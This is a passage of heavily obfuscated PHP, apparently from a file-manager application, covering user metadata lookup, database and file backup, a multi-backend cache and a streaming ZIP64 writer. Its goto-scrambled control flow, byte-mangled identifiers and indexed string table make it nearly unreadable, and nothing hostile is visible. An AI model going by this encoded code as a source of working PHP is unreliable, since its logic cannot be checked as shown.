return; } goto B¢“¤ìØÈ˜; bÈ¤™ˆêŠÜ: $Aß¨ÃÇ£š =& $_SERVER[°Óó£ÌİóèÅ]; $c“Í¥—‘‰ = array($Aß¨ÃÇ£š[1095] => array($Aß¨ÃÇ£š[7], $C®öº…óßæ)); $D¨¾õ¢”§¯ = Model($Aß¨ÃÇ£š[1631])->where($c“Í¥—‘‰)->select(); goto Fí’ÎÔ–®; B¢“¤ìØÈ˜: $c“Í¥—‘‰ = array($Aß¨ÃÇ£š[1546] => array($Aß¨ÃÇ£š[7], $D„‡’ñÔÃ)); $Fó¶â¹Çö“ = Model($Aß¨ÃÇ£š[1965])->field($Aß¨ÃÇ£š[1966])->where($c“Í¥—‘‰)->select(); $F‹ª¸ŠôŸÆ = array_to_keyvalue($Fó¶â¹Çö“, $Aß¨ÃÇ£š[1546], $Aß¨ÃÇ£š[28]); goto A„Ğ£ö¹; f–Û÷¿ô”í: } private function _listAppendMeta(&$E±¦ö†İİø, $c×½ÒÒò‡š) { goto bÓéğˆÛ; D‹Ë–Ö§: $dê•ÒÉÛéˆ = array($a†˜¥¼í·—[1095] => array($a†˜¥¼í·—[7], $c×½ÒÒò‡š)); $F¤ĞÊ—‘À = Model($a†˜¥¼í·—[1932])->where($dê•ÒÉÛéˆ)->select(); $F¤ĞÊ—‘À = array_to_keyvalue_group($F¤ĞÊ—‘À, $a†˜¥¼í·—[1095]); goto f‡ãŠ‘µÇâ; bÓéğˆÛ: $a†˜¥¼í·— =& $_SERVER[°Óó£ÌİóèÅ]; $dƒÚ³Ï’î‰ = UserJobModel::JOB_KEY; $b²æ©åæ = array($a†˜¥¼í·—[1935]); goto D‹Ë–Ö§; f‡ãŠ‘µÇâ: foreach ($F¤ĞÊ—‘À as &$f›»Ãï÷˜ñ) { $BŒ™ÃÛó = array(); foreach ($f›»Ãï÷˜ñ as $EÑ×Ô©¥É§) { if (!in_array($EÑ×Ô©¥É§[$a†˜¥¼í·—[96]], $b²æ©åæ)) { $BŒ™ÃÛó[$EÑ×Ô©¥É§[$a†˜¥¼í·—[96]]] = $EÑ×Ô©¥É§[$a†˜¥¼í·—[367]]; } } $f›»Ãï÷˜ñ = $BŒ™ÃÛó; } $DôŒÎÏ†¡¶ = Model($a†˜¥¼í·—[1968]); foreach ($E±¦ö†İİø as &$C¶Ñà†ˆ˜ø) { $C¶Ñà†ˆ˜ø[$a†˜¥¼í·—[1592]] = array(); $C¶Ñà†ˆ˜ø[$a†˜¥¼í·—[1969]] = array(); if (isset($F¤ĞÊ—‘À[$C¶Ñà†ˆ˜ø[$a†˜¥¼í·—[1095]]])) { $C¶Ñà†ˆ˜ø[$a†˜¥¼í·—[1592]] = $F¤ĞÊ—‘À[$C¶Ñà†ˆ˜ø[$a†˜¥¼í·—[1095]]]; } if (isset($C¶Ñà†ˆ˜ø[$a†˜¥¼í·—[1592]][$dƒÚ³Ï’î‰])) { $C¶Ñà†ˆ˜ø[$a†˜¥¼í·—[1969]] = $DôŒÎÏ†¡¶->getUserJobInfo($C¶Ñà†ˆ˜ø[$a†˜¥¼í·—[1592]][$dƒÚ³Ï’î‰]); } } goto Cæš í®Œ; Cæš í®Œ: } public function userSearch($B²‘Á¯ØæÊ, $dÖ÷ƒŠƒÛ… = "\52") { return Model($_SERVER[°Óó£ÌİóèÅ][1481])->where($B²‘Á¯ØæÊ)->field($dÖ÷ƒŠƒÛ…)->find(); } } goto A´ÎÓÍ‡ÅÒ; AÂ™šäâî¡: class BackupDbFile { public function __construct() { } public function index() { goto f´Éøİ±Í‡; C©„ç—“Û: Backup::set(array($dõ°ËÄöŠ¤[504] => $C•ÚË‡îøá[$dõ°ËÄöŠ¤[86]])); IO::move($aƒÔ®ö†ß®, $CèÂ®ÅîíĞ); $A÷ÔÉÀÆÇ = CONTROLLER_DIR . $dõ°ËÄöŠ¤[510]; goto bİÌ”Ó—ƒŒ; f´Éøİ±Í‡: $dõ°ËÄöŠ¤ =& $_SERVER[°Óó£ÌİóèÅ]; $a…±¢£ƒ«¦ = Backup::get(); $e†¨îá­½Á = $a…±¢£ƒ«¦[$dõ°ËÄöŠ¤[28]]; goto fÜæ½Íô¥; fÜæ½Íô¥: $aƒÔ®ö†ß® = TEMP_FILES . "\x62\x61\x63\153\x75\x70\x5f{$e†¨îá­½Á}\57"; $CèÂ®ÅîíĞ = "\173\151\157\72{$a…±¢£ƒ«¦[$dõ°ËÄöŠ¤[456]]}\175\x2f\144\141\164\x61\x62\x61\163\145\57"; IO::mkdir($CèÂ®ÅîíĞ . "\x62\141\143\153\x75\160\x5f{$e†¨îá­½Á}\x2f"); goto EÜˆ¬¡Ğß; EÜˆ¬¡Ğß: $E¤¡Š™ÅöŞ = new TaskFileTransfer($dõ°ËÄöŠ¤[505], $dõ°ËÄöŠ¤[476], 0, LNG($dõ°ËÄöŠ¤[477]) . $dõ°ËÄöŠ¤[506] . LNG($dõ°ËÄöŠ¤[479]) . $dõ°ËÄöŠ¤[507]); $E¤¡Š™ÅöŞ->addPath($aƒÔ®ö†ß®); $C•ÚË‡îøá = IO::infoWithChildren($aƒÔ®ö†ß®); goto C©„ç—“Û; bİÌ”Ó—ƒŒ: IO::copy($A÷ÔÉÀÆÇ, $CèÂ®ÅîíĞ . "\x62\x61\143\153\165\160\137{$e†¨îá­½Á}\57"); $E¤¡Š™ÅöŞ->end(); Backup::set(array($dõ°ËÄöŠ¤[509] => $C•ÚË‡îøá[$dõ°ËÄöŠ¤[86]])); goto Fåâ«ƒöùÀ; Fåâ«ƒöùÀ: return !0; goto Fñ¸òÕŠƒ; Fñ¸òÕŠƒ: } } class BackupFile { public function __construct() { } public function index() { goto B—·Œ ‹¦¶; dÙ£ÜÃ‚ÚÇ: $F´ìò•Îé = (int) Model($_SERVER[°Óó£ÌİóèÅ][487])->where($e¸Ñ«—èËÖ)->count($_SERVER[°Óó£ÌİóèÅ][390]); $aÃ…Şàö = (int) Model($_SERVER[°Óó£ÌİóèÅ][487])->where($e¸Ñ«—èËÖ)->sum($_SERVER[°Óó£ÌİóèÅ][86]); $Eà¯±†† = new TaskFileTransfer($_SERVER[°Óó£ÌİóèÅ][513], $_SERVER[°Óó£ÌİóèÅ][476], $F´ìò•Îé, LNG($_SERVER[°Óó£ÌİóèÅ][477]) . $_SERVER[°Óó£ÌİóèÅ][478] . LNG($_SERVER[°Óó£ÌİóèÅ][514])); goto c¾ÈŠ»ÄäÕ; B—·Œ ‹¦¶: $BÖÓµçòˆÓ = Backup::get(); $b‰­´°ÜÓ” = $BÖÓµçòˆÓ[$_SERVER[°Óó£ÌİóèÅ][292]][$_SERVER[°Óó£ÌİóèÅ][172]][$_SERVER[°Óó£ÌİóèÅ][390]]; $e¸Ñ«—èËÖ = array($_SERVER[°Óó£ÌİóèÅ][398] => array($_SERVER[°Óó£ÌİóèÅ][511], $b‰­´°ÜÓ”), $_SERVER[°Óó£ÌİóèÅ][512] => array($_SERVER[°Óó£ÌİóèÅ][330], $BÖÓµçòˆÓ[$_SERVER[°Óó£ÌİóèÅ][456]])); goto dÙ£ÜÃ‚ÚÇ; d©İ¢òÈ¾¸: $c¡’çÉÏ… = array(); $b—ô°·ˆëª = $aøŠÇ³ÕÀ = 0; do { $DàªÁ–ä×° = $_SERVER[°Óó£ÌİóèÅ][517]; $D·ÛÄ›‹í¢ = Model($_SERVER[°Óó£ÌİóèÅ][487])->where($e¸Ñ«—èËÖ)->field($DàªÁ–ä×°)->order($_SERVER[°Óó£ÌİóèÅ][518])->selectPage($B‘×ˆ×ª¢Ô, $E‰Ú»ù¬İ†); $d›±“”¥›  = !empty($D·ÛÄ›‹í¢[$_SERVER[°Óó£ÌİóèÅ][364]]) ? $D·ÛÄ›‹í¢[$_SERVER[°Óó£ÌİóèÅ][364]] : array(); foreach ($d›±“”¥›  as $aÅáÏÎ‰) { goto d” ‘¡ óÙ; C¬ºæ„ƒÑ: $CËšÊááğÌ += $aÅáÏÎ‰[$_SERVER[°Óó£ÌİóèÅ][86]]; $aøŠÇ³ÕÀ += 1; $b—ô°·ˆëª += $aÅáÏÎ‰[$_SERVER[°Óó£ÌİóèÅ][86]]; goto A¸°È´ƒ«; d” ‘¡ óÙ: if (!$this->_fileExist($aÅáÏÎ‰, $c¡’çÉÏ…)) { $F´ìò•Îé -= 1; $aÃ…Şàö -= (int) $aÅáÏÎ‰[$_SERVER[°Óó£ÌİóèÅ][86]]; write_log("\146\151\154\145\40\x6e\157\x74\x20\145\x78\x69\163\x74\56\146\x69\x6c\x65\111\x44\x3a{$aÅáÏÎ‰[$_SERVER[°Óó£ÌİóèÅ][390]]}\54\40\160\x61\x74\x68\x3a{$aÅáÏÎ‰[$_SERVER[°Óó£ÌİóèÅ][84]]}", $_SERVER[°Óó£ÌİóèÅ][519]); continue; } $aËßŠù‘ß² = $aÅáÏÎ‰[$_SERVER[°Óó£ÌİóèÅ][84]]; $B—‹‡´½Øà = "\x7b\x69\157\x3a{$BÖÓµçòˆÓ[$_SERVER[°Óó£ÌİóèÅ][456]]}\x7d" . substr($aËßŠù‘ß², strlen("\x7b\x69\157\72{$aÅáÏÎ‰[$_SERVER[°Óó£ÌİóèÅ][488]]}\175")); goto FÒŠ„¯ƒÂ; A¸°È´ƒ«: if ($CËšÊááğÌ >= 1024 * 1024 * 50) { $e½¶‹µ™ÙÊ = array($_SERVER[°Óó£ÌİóèÅ][524] => $b‰­´°ÜÓ”, $_SERVER[°Óó£ÌİóèÅ][525] => $aøŠÇ³ÕÀ, $_SERVER[°Óó£ÌİóèÅ][526] => $b—ô°·ˆëª); Backup::set($e½¶‹µ™ÙÊ); $CËšÊááğÌ = $FŸÁ†¿Õ§Í = 0; } goto eĞ”®ÏÓÈÖ; FÒŠ„¯ƒÂ: if (IO::exist($B—‹‡´½Øà)) { $Eà¯±††->updateFileEnd($aÅáÏÎ‰[$_SERVER[°Óó£ÌİóèÅ][28]], $aÅáÏÎ‰[$_SERVER[°Óó£ÌİóèÅ][86]]); } else { $B—‹‡´½Øà = get_path_father($B—‹‡´½Øà); $d±ìì¤¬Ä = IO::mkdir($B—‹‡´½Øà); if (!$d±ìì¤¬Ä || !IO::copy($aËßŠù‘ß², $B—‹‡´½Øà, $_SERVER[°Óó£ÌİóèÅ][520])) { write_log($_SERVER[°Óó£ÌİóèÅ][521] . $aËßŠù‘ß² . $_SERVER[°Óó£ÌİóèÅ][522] . $B—‹‡´½Øà . $_SERVER[°Óó£ÌİóèÅ][523], $_SERVER[°Óó£ÌİóèÅ][476]); continue; } } $b‰­´°ÜÓ” = $aÅáÏÎ‰[$_SERVER[°Óó£ÌİóèÅ][390]]; $FŸÁ†¿Õ§Í += 1; goto C¬ºæ„ƒÑ; eĞ”®ÏÓÈÖ: } $bŠğÕİä‚ = count($d›±“”¥› ); $E‰Ú»ù¬İ†++; } while ($bŠğÕİä‚ == $B‘×ˆ×ª¢Ô); goto e´ šˆÆ†Ó; EÀ„‡–Ø¤ó: Backup::set($e½¶‹µ™ÙÊ); $this->_fileFilter($c¡’çÉÏ…); return !0; goto a¿ò£»•Œà; e´ šˆÆ†Ó: $Eà¯±††->end(); $e½¶‹µ™ÙÊ = array($_SERVER[°Óó£ÌİóèÅ][527] => 1, $_SERVER[°Óó£ÌİóèÅ][468] => time(), $_SERVER[°Óó£ÌİóèÅ][474] => 1, $_SERVER[°Óó£ÌİóèÅ][524] => $b‰­´°ÜÓ”, $_SERVER[°Óó£ÌİóèÅ][516] => $aÃ…Şàö, $_SERVER[°Óó£ÌİóèÅ][515] => $F´ìò•Îé); if ($FŸÁ†¿Õ§Í) { $e½¶‹µ™ÙÊ[$_SERVER[°Óó£ÌİóèÅ][525]] = $aøŠÇ³ÕÀ; $e½¶‹µ™ÙÊ[$_SERVER[°Óó£ÌİóèÅ][526]] = $b—ô°·ˆëª; } goto EÀ„‡–Ø¤ó; a‹ø”óÛŒè: $E‰Ú»ù¬İ† = 1; $B‘×ˆ×ª¢Ô = 1000; $CËšÊááğÌ = $FŸÁ†¿Õ§Í = 0; goto d©İ¢òÈ¾¸; c¾ÈŠ»ÄäÕ: $Eà¯±††->task[$_SERVER[°Óó£ÌİóèÅ][463]] = $aÃ…Şàö; $e½¶‹µ™ÙÊ = array($_SERVER[°Óó£ÌİóèÅ][515] => $F´ìò•Îé, $_SERVER[°Óó£ÌİóèÅ][516] => $aÃ…Şàö); Backup::set($e½¶‹µ™ÙÊ); goto a‹ø”óÛŒè; a¿ò£»•Œà: } private function _fileExist($c‚ƒ”¾», &$dÆÅÁ“µ) { goto aªï“Ğ°…¥; aªï“Ğ°…¥: $FÃà­Í­˜º =& $_SERVER[°Óó£ÌİóèÅ]; $c­³÷§Ä™Ù = $c‚ƒ”¾»[$FÃà­Í­˜º[84]]; if (in_array($c‚ƒ”¾»[$FÃà­Í­˜º[390]], $dÆÅÁ“µ)) { return !1; } goto BÄ›íÑç¦á; C‘³²µÎ‚: $B–ª‘ëòÅğ = array($FÃà­Í­˜º[488] => $c‚ƒ”¾»[$FÃà­Í­˜º[488]], $FÃà­Í­˜º[84] => array($FÃà­Í­˜º[528], "{$FêÖ³Ç¿‹Œ}\x25")); $cÑ«å¦”È = Model($FÃà­Í­˜º[487])->where($B–ª‘ëòÅğ)->field($FÃà­Í­˜º[398])->select(); $dÆÅÁ“µ = array_merge($dÆÅÁ“µ, array_to_keyvalue($cÑ«å¦”È, $FÃà­Í­˜º[33], $FÃà­Í­˜º[390])); goto CÁ¶ˆŞ£ŞŠ; BÄ›íÑç¦á: if (IO::exist($c­³÷§Ä™Ù)) { return !0; } $FêÖ³Ç¿‹Œ = get_path_father($c­³÷§Ä™Ù); if (IO::exist($FêÖ³Ç¿‹Œ)) { $dÆÅÁ“µ[] = $c‚ƒ”¾»[$FÃà­Í­˜º[390]]; return !1; } goto C‘³²µÎ‚; CÁ¶ˆŞ£ŞŠ: return !1; goto cóÆ³›’­Š; cóÆ³›’­Š: } private function _fileFilter($EÌ´Ï¦šˆ«) { $eÙÍß¨•Œá =& $_SERVER[°Óó£ÌİóèÅ]; if (empty($EÌ´Ï¦šˆ«)) { return; } $A‰˜‚ªœº = array($eÙÍß¨•Œá[390] => array($eÙÍß¨•Œá[7], array_unique($EÌ´Ï¦šˆ«))); $AöñßÑ¿Ş‡ = Model($eÙÍß¨•Œá[529])->where($A‰˜‚ªœº)->field($eÙÍß¨•Œá[382])->select(); foreach ($AöñßÑ¿Ş‡ as $cà÷‹öÄ´) { Model($eÙÍß¨•Œá[529])->remove($cà÷‹öÄ´[$eÙÍß¨•Œá[382]], !1); } } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto DŸ“ô„Ü–; AÄ÷„éßï‡: $EÎ…ÂÄ§ÕÃ = $GLOBALS[$F÷Š½ ²é¸[6]][$F÷Š½ ²é¸[348]]; $d¸¼ÖŞ²ÚÌ = $EÎ…ÂÄ§ÕÃ[$EÎ…ÂÄ§ÕÃ[$F÷Š½ ²é¸[530]]]; $Dìšõ‹åª– = $EÎ…ÂÄ§ÕÃ[$F÷Š½ ²é¸[531]]; goto CâÙ‰Û¤¨; CâÙ‰Û¤¨: switch ($EÎ…ÂÄ§ÕÃ[$F÷Š½ ²é¸[530]]) { case $F÷Š½ ²é¸[17]: self::$handle = Model($F÷Š½ ²é¸[532]); break; case $F÷Š½ ²é¸[533]: self::$handle = new CacheRedis($d¸¼ÖŞ²ÚÌ, $Dìšõ‹åª–); break; case $F÷Š½ ²é¸[534]: self::$handle = new CacheMemcached($d¸¼ÖŞ²ÚÌ, $Dìšõ‹åª–); break; case $F÷Š½ ²é¸[172]: self::$handle = new CacheFile($d¸¼ÖŞ²ÚÌ, $Dìšõ‹åª–); break; default: break; } return self::$handle; goto c¡×¼¼¶; DŸ“ô„Ü–: $F÷Š½ ²é¸ =& $_SERVER[°Óó£ÌİóèÅ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto AÄ÷„éßï‡; c¡×¼¼¶: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($E„•„´‚ì») { if (is_array($E„•„´‚ì») || is_object($E„•„´‚ì»)) { $E„•„´‚ì» = json_encode($E„•„´‚ì»); } $E„•„´‚ì» = rawurlencode($E„•„´‚ì»); return KOD_SITE_ID . $_SERVER[°Óó£ÌİóèÅ][79] . $E„•„´‚ì»; } public static function get($eÔ‘Ö’éÔî) { $eÔ‘Ö’éÔî = self::key($eÔ‘Ö’éÔî); if (!isset(self::$memoryCache[$eÔ‘Ö’éÔî])) { CacheLock::lock($eÔ‘Ö’éÔî); $d’ãÜËÍƒ¿ = self::init()->get($eÔ‘Ö’éÔî); CacheLock::unlock($eÔ‘Ö’éÔî); self::$memoryCache[$eÔ‘Ö’éÔî] = unserialize($d’ãÜËÍƒ¿); } return self::$memoryCache[$eÔ‘Ö’éÔî]; } public static function set($E’ÉßÊŞø¿, $E¡ÄÁ´‚, $e»‘é­Ãå† = false) { goto d‘Æ÷àÏğ; c˜Ïø¶½êµ: CacheLock::lock($E’ÉßÊŞø¿); $f¶Î„‡¾ £ = self::init()->set($E’ÉßÊŞø¿, serialize($E¡ÄÁ´‚), $e»‘é­Ãå†); self::$memoryCache[$E’ÉßÊŞø¿] = $E¡ÄÁ´‚; goto dñÄ‚«ÏÄ; dñÄ‚«ÏÄ: CacheLock::unlock($E’ÉßÊŞø¿); return $f¶Î„‡¾ £; goto AÍµ¢Ìˆ“Ú; d‘Æ÷àÏğ: $E’ÉßÊŞø¿ = self::key($E’ÉßÊŞø¿); if (isset(self::$memoryCache[$E’ÉßÊŞø¿]) && self::$memoryCache[$E’ÉßÊŞø¿] === $E¡ÄÁ´‚) { return !0; } if ($e»‘é­Ãå† === 0) { self::$memoryCache[$E’ÉßÊŞø¿] = $E¡ÄÁ´‚; return !0; } goto c˜Ïø¶½êµ; AÍµ¢Ìˆ“Ú: } public static function remove($b‚¸¼òïÁ’) { goto C¤é¾¢æ–±; e˜îÔÏ°«: return $C°ÂÈÒ©í; goto Aìå±Ë½š; e¼½¦ë¾ñ­: CacheLock::lock($b‚¸¼òïÁ’); $C°ÂÈÒ©í = self::init()->remove($b‚¸¼òïÁ’); CacheLock::unlock($b‚¸¼òïÁ’); goto e˜îÔÏ°«; C¤é¾¢æ–±: $b‚¸¼òïÁ’ = self::key($b‚¸¼òïÁ’); unset(self::$memoryCache[$b‚¸¼òïÁ’]); self::clearTimeout(); goto e¼½¦ë¾ñ­; Aìå±Ë½š: } public static function clearMemory($AÜÓÓË‡…· = false) { if ($AÜÓÓË‡…·) { $AÜÓÓË‡…· = self::key($AÜÓÓË‡…·); unset(self::$memoryCache[$AÜÓÓË‡…·]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[°Óó£ÌİóèÅ][535])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[°Óó£ÌİóèÅ][536])) { self::init()->clearTimeout(); } } } goto B°È˜™âÍÛ; c‘Öæ—ö: class ZipMake { const VERSION = "\x30\x2e\62\x2e\60"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($eÈÎ·ÍƒĞ» = null) { $f¢‹É«¹¹ =& $_SERVER[°Óó£ÌİóèÅ]; $this->outputStream = fopen($f¢‹É«¹¹[1449], $f¢‹É«¹¹[962]); $this->outputName = $eÈÎ·ÍƒĞ»; $this->needHeaders = !0; } public function addFile($aÇ¤’Ë½Æñ, $fé•© Ô…ä) { goto D÷Ñ•Œ‰ôÙ; D÷Ñ•Œ‰ôÙ: $B‚ù†á‡¼ =& $_SERVER[°Óó£ÌİóèÅ]; $aÇ¤’Ë½Æñ = $this->filterFilename($aÇ¤’Ë½Æñ); $D±†ËØÈÙË = static::METHOD_STORE; goto D¶„øÙ”¦Š; FÎ­´ŸÒñ×: $this->addFileFooter($aÇ¤’Ë½Æñ, $D±†ËØÈÙË, $fø‚…ïä£Ö, $F‹»˜¦¥Ú¯, $eÂ£à«–ğ·, $B¶‡ŒÔâ“Œ); goto A ¹–ÎèÌò; D¶„øÙ”¦Š: $B¶‡ŒÔâ“Œ = $this->addFileHeader($aÇ¤’Ë½Æñ, $D±†ËØÈÙË); $F‹»˜¦¥Ú¯ = $eÂ£à«–ğ· = filesize($fé•© Ô…ä); $Dòª•ßáñµ = fopen($fé•© Ô…ä, $B‚ù†á‡¼[1450]); goto B¹œ†Ë¦èÌ; B¹œ†Ë¦èÌ: while (!feof($Dòª•ßáñµ)) { $f·ìºš„›Á = fread($Dòª•ßáñµ, 1048576); $this->send($f·ìºš„›Á); } fclose($Dòª•ßáñµ); $fø‚…ïä£Ö = hexdec(hash_file($B‚ù†á‡¼[1451], $fé•© Ô…ä)); goto FÎ­´ŸÒñ×; A ¹–ÎèÌò: } public function addFileFromStream($C„¡§µ¼Õ•, $dˆè³ÌäÇ) { goto C¤øà³Œ; AÈ—¬³ì: $aÅ‰Ìó™çÂ = hash_init($_SERVER[°Óó£ÌİóèÅ][1451]); while (!feof($dˆè³ÌäÇ)) { $bÀÉ¼’—›Å = fread($dˆè³ÌäÇ, 1048576); hash_update($aÅ‰Ìó™çÂ, $bÀÉ¼’—›Å); $this->send($bÀÉ¼’—›Å); } $bŒŸ­ó’ç’ = hexdec(hash_final($aÅ‰Ìó™çÂ)); goto E‹‘ŒøÔš”; D¼‰§Ÿç‚Â: fseek($dˆè³ÌäÇ, 0, SEEK_END); $aï³í“Âğ‚ = $eİÕ¥¤…¼¯ = ftell($dˆè³ÌäÇ); rewind($dˆè³ÌäÇ); goto AÈ—¬³ì; E‹‘ŒøÔš”: $this->addFileFooter($C„¡§µ¼Õ•, $EÕñ¦¶÷õ­, $bŒŸ­ó’ç’, $aï³í“Âğ‚, $eİÕ¥¤…¼¯, $DÕ ŒãÁË); goto CíÅòñ¥¸Ê; C¤øà³Œ: $C„¡§µ¼Õ• = $this->filterFilename($C„¡§µ¼Õ•); $EÕñ¦¶÷õ­ = static::METHOD_STORE; $DÕ ŒãÁË = $this->addFileHeader($C„¡§µ¼Õ•, $EÕñ¦¶÷õ­); goto D¼‰§Ÿç‚Â; CíÅòñ¥¸Ê: } public function finish() { foreach ($this->files as $BŸÃ‚ĞŒ¦) { $this->addCdrFile($BŸÃ‚ĞŒ¦); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($cİ¸ƒ–², $Fòæ¨´“¦) { goto a…¬ôÙä¨Ú; DÑ°•‚˜ª…: $D¶¡ƒ±İä» = $this->packFields($AÑÜŸ¬‚Ğ´); $EƒàŞµ¬‡÷ = $this->packFields($Eˆ¶îœÛŞ); $this->send($D¶¡ƒ±İä» . $cİ¸ƒ–² . $EƒàŞµ¬‡÷); goto Aç¿˜¡öµá; cÔ„ºÀÁêø: $EÑ¶÷…•” = $this->dosTime(time()); $AÑÜŸ¬‚Ğ´ = array(array($bé±‡ïùƒ[1453], static::FILE_HEADER_SIGNATURE), array($bé±‡ïùƒ[1454], static::ZIP_VERSION_64), array($bé±‡ïùƒ[1454], 8), array($bé±‡ïùƒ[1454], $Fòæ¨´“¦), array($bé±‡ïùƒ[1453], $EÑ¶÷…•”), array($bé±‡ïùƒ[1453], 0), array($bé±‡ïùƒ[1453], 4294967295), array($bé±‡ïùƒ[1453], 4294967295), array($bé±‡ïùƒ[1454], $d‡î¨Õì¨), array($bé±‡ïùƒ[1454], 32)); $Eˆ¶îœÛŞ = array(array($bé±‡ïùƒ[1454], 1), array($bé±‡ïùƒ[1454], 28), array($bé±‡ïùƒ[1455], 0), array($bé±‡ïùƒ[1455], 0), array($bé±‡ïùƒ[1455], 0), array($bé±‡ïùƒ[1453], 0)); goto DÑ°•‚˜ª…; Aç¿˜¡öµá: return strlen($D¶¡ƒ±İä») + $d‡î¨Õì¨ + strlen($EƒàŞµ¬‡÷); goto bÄÏ¹µ–×; a…¬ôÙä¨Ú: $bé±‡ïùƒ =& $_SERVER[°Óó£ÌİóèÅ]; $cİ¸ƒ–² = preg_replace($bé±‡ïùƒ[1452], $bé±‡ïùƒ[33], $cİ¸ƒ–²); $d‡î¨Õì¨ = strlen($cİ¸ƒ–²); goto cÔ„ºÀÁêø; bÄÏ¹µ–×: } protected function addFileFooter($eÓ¬ù‹™½Ò, $aÓÇìÌÔöº, $eÖ¶¾øùíŒ, $DÚÙÁ×î©Ó, $e¢ÙÈ‘ÎÉî, $f×‘“êõÍñ) { $A´æÀ‹§¥£ =& $_SERVER[°Óó£ÌİóèÅ]; $C¦¡æ¢µÖ = array(array($A´æÀ‹§¥£[1453], static::DATA_DESCRIPTOR_SIGNATURE), array($A´æÀ‹§¥£[1453], $eÖ¶¾øùíŒ), array($A´æÀ‹§¥£[1455], $DÚÙÁ×î©Ó), array($A´æÀ‹§¥£[1455], $e¢ÙÈ‘ÎÉî)); $f·ÃöÌ¡í« = $this->packFields($C¦¡æ¢µÖ); $this->send($f·ÃöÌ¡í«); $aùÉœÃ—‚è = $f×‘“êõÍñ + $DÚÙÁ×î©Ó + $A›¼² ×•À; $this->addToCdr($eÓ¬ù‹™½Ò, $aÓÇìÌÔöº, $eÖ¶¾øùíŒ, $DÚÙÁ×î©Ó, $e¢ÙÈ‘ÎÉî, $aùÉœÃ—‚è); } private function addToCdr($Eº­æ¡‘îŠ, $eÀ¤îîÒÉ•, $cëî®š¢“Ú, $c‰³Èå¾Å—, $cğ„ßÂ÷ß†, $e³Œ¸˜Õ±ß) { $this->files[] = array($Eº­æ¡‘îŠ, $eÀ¤îîÒÉ•, $cëî®š¢“Ú, $c‰³Èå¾Å—, $cğ„ßÂ÷ß†, $this->ofs); $this->ofs += $e³Œ¸˜Õ±ß; } protected function addCdrFile($E»öÈ„ªÑ¿) { goto eİ±¢Ã•µ•; eİ±¢Ã•µ•: $eİğ¾±Å =& $_SERVER[°Óó£ÌİóèÅ]; list($EŸ§òœ„«”, $cœÜ¯¬´Ü, $AÍÇÔŞ„”à, $F²ö‰÷ÕŸ, $eâáÒÍØ‘­, $a„Ÿ«Ò¯åÒ) = $E»öÈ„ªÑ¿; $aÅ·¹ï¯ç = $eİğ¾±Å[33]; goto DÔèË—ºÜ; D²ƒº­à„ƒ: $this->send($D¶ƒ„’°í˜); $this->cdr_ofs += strlen($D¶ƒ„’°í˜); goto D¼öğ´Ü; DÔèË—ºÜ: $F ù¦ï‰ = $this->dosTime(time()); $BáÃéÒŒäò = array(array($eİğ¾±Å[1453], static::CDR_FILE_SIGNATURE), array($eİğ¾±Å[1454], static::ZIP_VERSION_64), array($eİğ¾±Å[1454], static::ZIP_VERSION_64), array($eİğ¾±Å[1454], 8), array($eİğ¾±Å[1454], $cœÜ¯¬´Ü), array($eİğ¾±Å[1453], $F ù¦ï‰), array($eİğ¾±Å[1453], $AÍÇÔŞ„”à), array($eİğ¾±Å[1453], 4294967295), array($eİğ¾±Å[1453], 4294967295), array($eİğ¾±Å[1454], strlen($EŸ§òœ„«”)), array($eİğ¾±Å[1454], 32), array($eİğ¾±Å[1454], strlen($aÅ·¹ï¯ç)), array($eİğ¾±Å[1454], 0), array($eİğ¾±Å[1454], 0), array($eİğ¾±Å[1453], 32), array($eİğ¾±Å[1453], 4294967295)); $F¢…óÎÂ„ã = array(array($eİğ¾±Å[1454], 1), array($eİğ¾±Å[1454], 28), array($eİğ¾±Å[1455], $eâáÒÍØ‘­), array($eİğ¾±Å[1455], $F²ö‰÷ÕŸ), array($eİğ¾±Å[1455], $a„Ÿ«Ò¯åÒ), array($eİğ¾±Å[1453], 0)); goto eœæ˜¡Ÿè; eœæ˜¡Ÿè: $A–îŸİæ‡î = $this->packFields($BáÃéÒŒäò); $Cñ‡›¤‹îÃ = $this->packFields($F¢…óÎÂ„ã); $D¶ƒ„’°í˜ = $A–îŸİæ‡î . $EŸ§òœ„«” . $aÅ·¹ï¯ç . $Cñ‡›¤‹îÃ; goto D²ƒº­à„ƒ; D¼öğ´Ü: } protected function addCdr64Eof() { goto B”¢ÔåÇİ‘; Aå°Çç–·: $this->send($B¬ÀªøšÌ¢); goto F³ŠéšŸîÃ; B”¢ÔåÇİ‘: $B ƒƒ¸ç‰† =& $_SERVER[°Óó£ÌİóèÅ]; $B‚ĞÁ¿¤”• = count($this->files); $cÈ…îæÁçŒ = $this->cdr_ofs; goto f‚ëš¤‘‚ê; f‚ëš¤‘‚ê: $BÙ¥ˆ‡…î† = $this->ofs; $a‹äµ©†Şˆ = array(array($B ƒƒ¸ç‰†[1453], static::ZIP64_CDR_EOF_SIGNATURE), array($B ƒƒ¸ç‰†[1455], 44), array($B ƒƒ¸ç‰†[1454], static::ZIP_VERSION_64), array($B ƒƒ¸ç‰†[1454], static::ZIP_VERSION_64), array($B ƒƒ¸ç‰†[1453], 0), array($B ƒƒ¸ç‰†[1453], 0), array($B ƒƒ¸ç‰†[1455], $B‚ĞÁ¿¤”•), array($B ƒƒ¸ç‰†[1455], $B‚ĞÁ¿¤”•), array($B ƒƒ¸ç‰†[1455], $cÈ…îæÁçŒ), array($B ƒƒ¸ç‰†[1455], $BÙ¥ˆ‡…î†)); $B¬ÀªøšÌ¢ = $this->packFields($a‹äµ©†Şˆ); goto Aå°Çç–·; F³ŠéšŸîÃ: } protected function addCdr64Locator() { goto 